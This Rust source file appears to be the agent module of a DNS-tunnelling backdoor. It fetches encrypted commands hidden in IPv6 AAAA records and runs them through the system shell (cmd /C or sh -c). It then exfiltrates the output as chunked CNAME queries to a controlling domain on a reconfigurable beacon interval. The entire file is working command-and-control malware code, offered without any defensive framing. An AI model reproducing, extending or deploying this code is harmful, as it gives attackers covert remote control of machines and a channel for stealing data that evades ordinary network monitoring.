use crate::request;
use crate::crypto;
use std::process::Command;
use crate::SLEEP;


// Parse and execute the provided command and return the output
pub fn execute(cmd: String) -> String {
    let to_return: String;

    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", cmd.replace("\0", "").trim()])
            .output()
            .expect("failed to execute process")
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(cmd.replace("\0", "").trim())
            .output()
            .expect("failed to execute process")
    };    

    // Return the output or the error if any
    if output.stdout.is_empty() && !output.stderr.is_empty() {
        to_return = String::from_utf8(output.stderr).unwrap();
    } else if output.stderr.is_empty() && !output.stdout.is_empty() {
        to_return = String::from_utf8(output.stdout).unwrap();
    } else {
        //Maybe useless... fallback for commands that have no output
        to_return = "No output for this command".to_string();
    }

    return to_return;
}


// Reconfigure the sleep interval if "reconfigure_sleep SECONDS" is received
pub fn reconfigure_sleep(cmd: String) {
    let mut parts: Vec<&str> = cmd.split(" ").collect();
    match parts.pop() {
        Some(t) => {
            //println!("[+] Reconfiguring sleep to {}", t);
            unsafe {
                SLEEP = match t.replace("\0", "").trim().parse::<u64>() {
                    Ok(t) => t,
                    Err(e) => {
                        println!("[!] Error converting to seconds: {}", e);    
                        30
                    }
                }
            }
        },
        None => {}
    };
}

// Get commands to execute encoded as an IPv6 addresses
pub fn get_commands(domain: &str) -> String {
    let ipv6addrs: Vec<String> = request::dns_request(domain, "aaaa_record");
    let commands: String = ipv6_decode(ipv6addrs);
    return commands;
}


// Exfiltrate the executed command's output as a series of CNAME requests
// and a final A request to signify that there is no more data
pub fn exfiltrate_data(data: String, domain: &str) -> Vec<String> {

    let to_exfil: Vec<String> = construct_queries(&data, &domain);
    for part in to_exfil {
        // Make the base64 dns safe by replacing special chars
        let dns_safe = part.trim_end()
            .replace("/", "-1")
            .replace("+", "--")
            .replace("=", "-0");

        let _res = request::dns_request(dns_safe.as_str(), "cname_record");
    };

    let _ = request::dns_request(domain, "a_record");
    // Possibly return the response
    return Vec::new();
}


// Break the executed command's output to chunks  and
// construct domains to be queried so the data can be exfiltrated
pub fn construct_queries(output: &str, domain: &str) -> Vec<String> {
    let mut exfiltrate: Vec<String> = Vec::new();
    let mut current_group = String::new();

    // If the output is less than 50 chars just construct the query and return it
    if output.len() < 50 {

        // Adding this because of the stupid rule in the rust 
        // dns-server crate that every label needs to start with letter
        let mut padded: String = output.to_string();
        padded.insert(0, 'A');
        padded.push('A');

        current_group = format!("{}.{}", padded, domain);
        exfiltrate.push(current_group);
        return exfiltrate;
    }

    // If its bigger than 63 chars, split it in chunks and construct queries 
    let chunks: Vec<String> = output.as_bytes()
                                .chunks(50)
                                .map(|chunk| { 
                                    let mut modified = String::from_utf8(chunk.to_vec()).unwrap(); 
                                    modified.insert(0, 'A');                //Make sure that every part always starts with a letter
                                    modified.insert(modified.len(), 'A');
                                    modified
                                })
                                .collect();


    for chunk in chunks {
        // If the dns server receives buffer full, the total length 240 should
        // be reduced, by RFC UDP dns responses cant be bigger than 512 bytes..
        if current_group.len() + chunk.len() + 1 > 240 - domain.len() {
            current_group.push_str(domain);
            exfiltrate.push(current_group.trim_end().to_string());
            current_group.clear();
        }

        current_group.push_str(chunk.as_str());
        current_group.push_str(".");
    }

    // Push the final accumulated data if any
    if !current_group.is_empty() {
        current_group.push_str(domain);
        exfiltrate.push(current_group.trim_end().to_string());
    }

    return exfiltrate;
}


// Decode the received IPv6 addresses to a string command that will be executed
pub fn ipv6_decode(ipv6_vector: Vec<String>) -> String {

    // Split the IPv6-like address into parts based on the colon delimiter
    let mut strings: Vec<String> = Vec::new();

    for ipv6_like in ipv6_vector {
        let parts: Vec<&str> = ipv6_like.split(':').collect();
    
        // Convert each part to bytes
        let mut bytes = Vec::new();
        for part in parts {
            let byte_pair = match u16::from_str_radix(part, 16) {
                Ok(data) => data,
                Err(_e) => {
                    continue;
                }
            };
            bytes.push((byte_pair >> 8) as u8); // High byte
            bytes.push((byte_pair & 0xFF) as u8); // Low byte
        }
        strings.push(String::from_utf8(bytes).unwrap());
    }

    // Decrypt the received commands
    let decrypted: Vec<u8> = crypto::decrypt(strings.join(""));
    match String::from_utf8(decrypted) {
        Ok(cmd) => cmd,
        Err(_e) => {
            // If decryption fails return empty
            "".to_string()
        }
    }
}